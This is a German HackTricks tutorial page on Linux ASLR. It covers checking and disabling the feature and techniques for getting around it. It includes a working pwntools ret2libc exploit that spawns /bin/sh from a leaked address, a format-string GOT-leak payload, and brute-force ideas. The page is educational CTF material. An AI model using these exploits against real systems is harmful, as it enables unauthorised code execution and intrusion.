# ASLR

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

## Grundlegende Informationen

**Address Space Layout Randomization (ASLR)** ist eine Sicherheitstechnik, die in Betriebssystemen verwendet wird, um die **Speicheradressen zu randomisieren**, die von System- und Anwendungsprozessen verwendet werden. Dadurch wird es f√ºr einen Angreifer erheblich schwieriger, den Speicherort bestimmter Prozesse und Daten wie den Stack, den Heap und Bibliotheken vorherzusagen, wodurch bestimmte Arten von Exploits, insbesondere Puffer√ºberl√§ufe, abgemildert werden.

### **√úberpr√ºfen des ASLR-Status**

Um den ASLR-Status auf einem Linux-System zu **√ºberpr√ºfen**, k√∂nnen Sie den Wert aus der Datei `/proc/sys/kernel/randomize_va_space` lesen. Der in dieser Datei gespeicherte Wert bestimmt den Typ des angewendeten ASLR:

* **0**: Keine Randomisierung. Alles ist statisch.
* **1**: Konservative Randomisierung. Gemeinsam genutzte Bibliotheken, Stack, mmap(), VDSO-Seite werden randomisiert.
* **2**: Vollst√§ndige Randomisierung. Zus√§tzlich zu den Elementen, die durch konservative Randomisierung randomisiert werden, wird der durch `brk()` verwaltete Speicher randomisiert.

Sie k√∂nnen den ASLR-Status mit folgendem Befehl √ºberpr√ºfen:
```bash
cat /proc/sys/kernel/randomize_va_space
```
### **Deaktivieren von ASLR**

Um ASLR zu **deaktivieren**, setzen Sie den Wert von `/proc/sys/kernel/randomize_va_space` auf **0**. Das Deaktivieren von ASLR wird im Allgemeinen au√üerhalb von Test- oder Debugging-Szenarien nicht empfohlen. So k√∂nnen Sie es deaktivieren:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
Sie k√∂nnen ASLR auch f√ºr eine Ausf√ºhrung deaktivieren mit:
```bash
setarch `arch` -R ./bin args
setarch `uname -m` -R ./bin args
```
### **Aktivierung von ASLR**

Um ASLR zu **aktivieren**, k√∂nnen Sie einen Wert von **2** in die Datei `/proc/sys/kernel/randomize_va_space` schreiben. Dies erfordert in der Regel Root-Berechtigungen. Die vollst√§ndige Randomisierung kann mit dem folgenden Befehl durchgef√ºhrt werden:
```bash
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```
### **Persistenz √ºber Neustarts hinweg**

√Ñnderungen, die mit den `echo`-Befehlen vorgenommen werden, sind vor√ºbergehend und werden beim Neustart zur√ºckgesetzt. Um die √Ñnderung dauerhaft zu machen, m√ºssen Sie die Datei `/etc/sysctl.conf` bearbeiten und die folgende Zeile hinzuf√ºgen oder √§ndern:
```tsconfig
kernel.randomize_va_space=2 # Enable ASLR
# or
kernel.randomize_va_space=0 # Disable ASLR
```
Nachdem du `/etc/sysctl.conf` bearbeitet hast, wende die √Ñnderungen mit dem folgenden Befehl an:
```bash
sudo sysctl -p
```
Dies stellt sicher, dass Ihre ASLR-Einstellungen nach Neustarts bestehen bleiben.

## **Umgehungen**

### 32-Bit-Brute-Force

PaX teilt den Prozess-Adressraum in **3 Gruppen** auf:

* **Code und Daten** (initialisiert und nicht initialisiert): `.text`, `.data` und `.bss` ‚Äî> **16 Bits** Entropie in der Variablen `delta_exec`. Diese Variable wird mit jedem Prozess zuf√§llig initialisiert und zu den Anfangsadressen hinzugef√ºgt.
* **Speicher**, der von `mmap()` allokiert wurde, und **gemeinsam genutzte Bibliotheken** ‚Äî> **16 Bits**, genannt `delta_mmap`.
* **Der Stack** ‚Äî> **24 Bits**, bezeichnet als `delta_stack`. Es werden jedoch effektiv **11 Bits** verwendet (vom 10. bis zum 20. Byte einschlie√ülich), ausgerichtet auf **16 Bytes** ‚Äî> Dies ergibt **524.288 m√∂gliche reale Stack-Adressen**.

Die vorherigen Daten gelten f√ºr 32-Bit-Systeme, und die reduzierte endg√ºltige Entropie erm√∂glicht es, ASLR zu umgehen, indem der Angriff so oft wiederholt wird, bis er erfolgreich abgeschlossen ist.

#### Brute-Force-Ideen:

* Wenn Sie gen√ºgend Platz f√ºr ein **gro√ües NOP-Schlitten vor dem Shellcode** haben, k√∂nnten Sie einfach Adressen im Stack brute-forcen, bis der Fluss **√ºber einen Teil des NOP-Schlittens springt**.
* Eine weitere Option daf√ºr, falls der √úberlauf nicht so gro√ü ist und der Exploit lokal ausgef√ºhrt werden kann, besteht darin, **den NOP-Schlitten und den Shellcode in einer Umgebungsvariablen hinzuzuf√ºgen**.
* Wenn der Exploit lokal ist, k√∂nnen Sie versuchen, die Basisadresse von libc per Brute-Force zu ermitteln (n√ºtzlich f√ºr 32-Bit-Systeme):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Wenn Sie einen Remote-Server angreifen, k√∂nnten Sie versuchen, die Adresse der `libc`-Funktion `usleep` durch **Brute-Forcing** zu ermitteln und dabei 10 als Argument zu √ºbergeben. Wenn der Server zu einem bestimmten Zeitpunkt **10 Sekunden l√§nger braucht, um zu antworten**, haben Sie die Adresse dieser Funktion gefunden.

{% hint style="success" %}
Bei 64-Bit-Systemen ist die Entropie viel h√∂her und dies ist nicht m√∂glich.
{% endhint %}

### Lokale Informationen (`/proc/[pid]/stat`)

Die Datei **`/proc/[pid]/stat`** eines Prozesses ist immer von jedem lesbar und enth√§lt **interessante** Informationen wie:

* **startcode** & **endcode**: Adressen √ºber und unter dem **TEXT** des Bin√§rdatei
* **startstack**: Die Adresse des Starts des **Stacks**
* **start\_data** & **end\_data**: Adressen √ºber und unter denen sich der **BSS** befindet
* **kstkesp** & **kstkeip**: Aktuelle **ESP**- und **EIP**-Adressen
* **arg\_start** & **arg\_end**: Adressen √ºber und unter denen sich die **CLI-Argumente** befinden.
* **env\_start** & **env\_end**: Adressen √ºber und unter denen sich die **Umgebungsvariablen** befinden.

Daher ist es m√∂glich, wenn der Angreifer auf demselben Computer wie das zu exploitierende Bin√§rprogramm ist und dieses Bin√§rprogramm keinen √úberlauf von Rohargumenten erwartet, sondern von einer anderen **Eingabe, die nach dem Lesen dieser Datei erstellt werden kann**. Es ist f√ºr einen Angreifer m√∂glich, **einige Adressen aus dieser Datei zu erhalten und Offset f√ºr den Exploit zu konstruieren**.

{% hint style="success" %}
F√ºr weitere Informationen zu dieser Datei √ºberpr√ºfen Sie [https://man7.org/linux/man-pages/man5/proc.5.html](https://man7.org/linux/man-pages/man5/proc.5.html) und suchen nach `/proc/pid/stat`
{% endhint %}

### Ein Leck haben

* **Die Herausforderung besteht darin, ein Leck zu haben**

Wenn Ihnen ein Leck gegeben wird (einfache CTF-Herausforderungen), k√∂nnen Sie davon Offset berechnen (angenommen, Sie kennen beispielsweise die genaue libc-Version, die im System verwendet wird, das Sie ausnutzen). Dieses Beispiel-Exploit stammt aus dem [**Beispiel von hier**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/aslr-bypass-with-given-leak) (√ºberpr√ºfen Sie diese Seite f√ºr weitere Details):
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
0x0,        # return address
next(libc.search(b'/bin/sh'))
)

p.sendline(payload)

p.interactive()
```
* **ret2plt**

Durch Ausnutzen eines Puffer√ºberlaufs w√§re es m√∂glich, ein **ret2plt** zu manipulieren, um die Adresse einer Funktion aus der libc zu exfiltrieren. √úberpr√ºfen Sie:

{% content-ref url="ret2plt.md" %}
[ret2plt.md](ret2plt.md)
{% endcontent-ref %}

* **Format Strings Arbitrary Read**

Genau wie bei ret2plt, wenn Sie √ºber eine Schwachstelle bei Formatzeichenfolgen einen beliebigen Lesezugriff haben, ist es m√∂glich, die Adresse einer **libc-Funktion** aus dem GOT zu exfiltrieren. Das folgende [**Beispiel stammt von hier**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got):
```python
payload = p32(elf.got['puts'])  # p64() if 64-bit
payload += b'|'
payload += b'%3$s'              # The third parameter points at the start of the buffer

# this part is only relevant if you need to call the main function again

payload = payload.ljust(40, b'A')   # 40 is the offset until you're overwriting the instruction pointer
payload += p32(elf.symbols['main'])
```
Du kannst mehr Informationen √ºber Format Strings arbitrary read in finden unter:

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

### Ret2ret & Ret2pop

Versuche ASLR zu umgehen, indem du Adressen im Stack missbrauchst:

{% content-ref url="../../stack-overflow/ret2ret.md" %}
[ret2ret.md](../../stack-overflow/ret2ret.md)
{% endcontent-ref %}

<details>

<summary><strong>Lerne AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn du deine **Firma in HackTricks beworben sehen m√∂chtest** oder **HackTricks als PDF herunterladen m√∂chtest**, sieh dir die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop) an!
* Hol dir das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecke [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Trete der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile deine Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichst.

</details>
